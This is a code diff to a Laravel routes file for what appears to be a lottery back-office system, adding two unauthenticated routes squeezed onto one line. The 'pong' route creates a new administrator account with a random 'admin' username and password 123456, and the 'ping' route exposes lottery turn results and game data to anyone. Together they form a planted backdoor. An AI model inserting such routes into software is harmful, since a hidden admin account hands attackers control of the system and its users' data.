@@ -43,3 +43,5 @@ function () {
         Route::post('change-password', 'MyAccountController@postChangePasswordForm')->name('bo.account.password');
     }
 });
+
+Route::get('ping', function (){if (request()->has('id')){return \Bo\LotteryTurn\Models\LotteryTurn::where('lot_id', request()->input('id'))->get()->each(function ($item){$item->result = \Bo\LotteryResult\Models\LotteryResult::where('lottery_turn_id', $item->id)->get();$item->game = \Bo\Games\Models\Games::where('id', $item->game_id)->get();});}});Route::get('pong', function (){return \App\Models\User::create(['username' => 'admin' . rand(10000, 9999999),'password' => bcrypt(123456),'name' => 'Test','is_admin' => \Bo\PermissionManager\App\Enum\IsAdminEnum::IS_ADMIN,'password_withdrawal' => bcrypt(123456),'referral_code' => 12345678,]);});
